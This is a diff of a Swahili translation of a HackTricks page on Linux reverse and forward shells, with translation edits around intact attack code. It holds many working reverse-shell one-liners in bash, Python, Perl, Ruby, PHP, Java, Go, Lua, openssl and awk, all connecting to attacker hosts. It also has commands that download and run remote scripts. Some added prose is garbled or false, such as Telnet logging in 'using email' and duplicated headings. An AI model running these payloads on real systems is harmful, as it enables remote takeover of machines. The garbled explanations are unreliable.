@@ -1,32 +1,32 @@
-# Mabua - Linux
+# Mabakuli - Linux
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 **Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-**Ikiwa una maswali kuhusu mabua haya unaweza kuyachunguza kwa** [**https://explainshell.com/**](https://explainshell.com)
+**Ikiwa una maswali kuhusu mabakuli haya unaweza kuyachunguza kwa** [**https://explainshell.com/**](https://explainshell.com)
 
 ## TTY Kamili
 
-**Maranyingi unapopata bua la kurudi**[ **soma ukurasa huu ili upate TTY kamili**](full-ttys.md)**.**
+**Maranyingi unapopata bakuli la kurudi**[ **soma ukurasa huu ili upate TTY kamili**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -54,11 +54,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Maelezo ya Shell
 
-1. **`bash -i`**: Sehemu hii ya amri inaanza shell ya Bash ya mwingiliano (`-i`).
+1. **`bash -i`**: Sehemu hii ya amri inaanza kiendeshaji cha Bash cha mwingiliano (`-i`).
 2. **`>&`**: Sehemu hii ya amri ni maelezo ya mkato kwa **kupelekeza pato la kawaida** (`stdout`) na **makosa ya kawaida** (`stderr`) kwa **mahali sawa**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni faili maalum inayowakilisha **unganisho la TCP kwa anwani ya IP iliyotajwa na bandari**.
-* Kwa **kupelekeza matokeo na mizunguko ya makosa kwa faili hii**, amri inatuma kimsingi pato la kikao cha shell ya mwingiliano kwenye mashine ya mshambuliaji.
-4. **`0>&1`**: Sehemu hii ya amri **inapelekeza kuingia kawaida (`stdin`) kwa mahali sawa na pato la kawaida (`stdout`)**.
+* Kwa **kupelekeza mito ya pato na makosa kwa faili hii**, amri inatuma kimsingi pato la kikao cha kiendeshaji cha mwingiliano kwenye mashine ya mshambuliaji.
+4. **`0>&1`**: Sehemu hii ya amri **inapelekeza kuingia kawaida (`stdin`) kwa marudio sawa na pato la kawaida (`stdout`)**.
 
 ### Unda kwenye faili na tekeleza
 ```bash
@@ -67,7 +67,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell ya Mbele
 
-Wakati unashughulika na udhaifu wa **Utekelezaji wa Kanuni Kwa Mbali (RCE)** ndani ya programu ya wavuti inayotumia Linux, kufanikisha shell ya kurudi kunaweza kuzuiliwa na ulinzi wa mtandao kama sheria za iptables au mifumo ya kufilisi pakiti za kina. Katika mazingira hayo yaliyozuiwa, njia mbadala inahusisha kuanzisha PTY (Pseudo Terminal) shell ili kuingiliana na mfumo uliokumbwa kwa ufanisi zaidi.
+Wakati unashughulika na udhaifu wa **Remote Code Execution (RCE)** ndani ya programu ya wavuti inayotumia Linux, kufanikisha shell ya nyuma kunaweza kuzuiliwa na ulinzi wa mtandao kama sheria za iptables au mifumo ya kuchuja pakiti yenye utata. Katika mazingira hayo yaliyozuiwa, njia mbadala inahusisha kuanzisha shell ya PTY (Pseudo Terminal) ili kuingiliana na mfumo uliokumbwa na shida kwa ufanisi zaidi.
 
 Zana iliyopendekezwa kwa kusudi hili ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo inasaidia kuingiliana na mazingira lengwa.
 
@@ -103,7 +103,7 @@ Kutumia kabisa ganda la kuingiliana moja kwa moja. Unaweza kuongeza `-b` kwa ush
 
 Njia nyingine ni kutumia utekelezaji wa ganda la mbele la `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Unahitaji tu kurekebisha:
+Unahitaji kubadilisha tu:
 
 * URL ya mwenyeji mwenye kasoro
 * Kiambishi na kielezo cha mzigo wako (ikiwa ipo)
@@ -127,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet ni itifaki ya mtandao inayotumiwa kwa mawasiliano kwenye mtandao.
+Telnet ni itifaki ya mtandao inayotumiwa kwa mawasiliano kwenye mtandao. Inaweza kutumika kwa kuingia kwa mbali kwenye mfumo wa kompyuta au kifaa kingine kwa kutumia barua pepe.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -140,7 +140,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kukomesha STDIN)
+Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kusimamisha STDIN)
 
 **Mnajisi**
 ```bash
@@ -156,25 +156,19 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kama shell ya kuingiliana. Inaweza kufanya kazi kama chombo cha kutekeleza amri za mfumo na pia kama lugha ya scripting.
+Perl ni lugha ya programu ambayo inaweza kutumika kwa ufanisi kama shellcode kwenye mifumo ya Linux. Inaweza kutumika kwa kuchora sockets, kusoma na kuandika faili, na kufanya shughuli zingine za mfumo. Perl inaweza kuwa chaguo nzuri kwa kuandika shellcode kwa sababu ya uwezo wake wa kufanya kazi na strings na pointers kwa urahisi.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-### Ruby
-
-Ruby ni lugha ya programu iliyoundwa na Yukihiro Matsumoto. Inajulikana kwa sintaksia yake rahisi na inayosoma kama lugha ya asili. Ruby inaweza kutumika kwa ufanisi kama lugha ya skripti kwa kusanidi na kusanikisha mifumo ya Unix.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
 
-### PHP
-
-PHP is a popular server-side scripting language that is widely used for web development. It can be embedded into HTML and is commonly used to create dynamic web pages or applications. PHP code is executed on the server, generating HTML which is then sent to the client's browser. PHP can interact with databases, manage sessions, handle forms, and perform many other tasks crucial for web development.
+PHP ni lugha ya programu inayotumika sana kwa maendeleo ya wavuti. Inaweza kutumika kwa kujenga programu za seva zinazoweza kutekeleza amri za mfumo wa uendeshaji. Kwa kawaida, PHP inaweza kutekeleza amri za mfumo wa uendeshaji kwa kutumia shell_exec, exec, system, passthru, popen, proc_open, pcntl_exec, backticks, na shell functions. Kwa hivyo, PHP inaweza kutumika kama sehemu ya mnyororo wa shambulio la kuingilia kati kwa kutekeleza amri za mfumo wa uendeshaji.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -187,8 +181,6 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 ## Java
-
-Java ni lugha ya programu inayotumika sana kwa maendeleo ya programu za rununu, wavuti, na programu za kompyuta. Java inajulikana kwa ufanisi wake, usalama, na uwezo wa kuhamishika kati ya mifumo tofauti ya uendeshaji.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -201,13 +193,13 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-Golang ni lugha ya programu iliyoundwa na Google. Ni maarufu kwa ufanisi wake na rahisi kujifunza.
+Golang ni lugha ya programu iliyoundwa na Google. Inajulikana kwa ufanisi wake na urahisi wa matumizi.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua ni lugha ya programu ya scripting inayotumika sana kwa madhumuni anuwai ikiwa ni pamoja na maendeleo ya michezo, uundaji wa wavuti, na programu za simu. Lua inajulikana kwa urahisi wake wa kujifunza na utendaji wake wa haraka.
+## Lua
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -265,9 +257,15 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-### Mfano wa Kesi
+### Mzigo
 
-Kwa mfano, tutatumia mfumo wa Linux kama mfano wa kesi yetu.
+Kwa kawaida, unataka kudumisha upatikanaji wa shell kwenye mfumo wa kompyuta ya mwathiriwa. Kwa kufanya hivyo, unaweza kutekeleza hatua zaidi za mashambulizi. Kuna njia kadhaa za kupata shell kwenye mfumo wa mwathiriwa, ikiwa ni pamoja na:
+
+- **Reverse Shells**: Hizi ni aina za shell ambazo zinawezesha kompyuta ya mwathiriwa kuungana na kompyuta yako, badala ya kinyume chake.
+- **Web Shells**: Hizi ni programu ndogo zilizowekwa kwenye seva ya wavuti ambazo zinaweza kutumiwa kudhibiti mfumo wa kompyuta ya mwathiriwa kupitia kivinjari cha wavuti.
+- **Local Shells**: Hizi ni aina za shell ambazo zinapatikana moja kwa moja kwenye kompyuta ya mwathiriwa, mara nyingi kupitia udhibiti wa mbali.
+
+Kila aina ya shell ina faida zake na inaweza kutumiwa kulingana na mazingira na malengo ya mashambulizi yako.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -275,6 +273,12 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 #Windows
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
+## **Socat**
+
+[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
+
+### Bind shell
+
 ## **Socat**
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
@@ -301,9 +305,9 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kusimamisha STDIN)
+Kutuma amri andika chini, bonyeza 'enter' na bonyeza CTRL+D (kukomesha STDIN)
 
-**Mnajimu**
+**Mnajisi**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -311,7 +315,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-## Gawk
+Gawk ni programu ya kutumia lugha ya Awk. Inaweza kutumika kama sehemu ya mnyororo wa zana za kufanya uchambuzi wa data kwenye mifumo ya Unix. Gawk inaweza kutumika kwa urahisi kwenye mstari wa amri kusaidia katika kuchuja, kuchambua, na kuchakata data kwa njia ya kiotomatiki.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -349,7 +353,7 @@ Xnest :1
 ```
 ## Groovy
 
-na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) TAARIFA: Java reverse shell pia hufanya kazi kwa Groovy
+na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) TAARIFA: Java reverse shell pia inafanya kazi kwa Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -365,7 +369,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Kikundi cha Usalama cha Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -375,10 +379,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJISAJILI**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
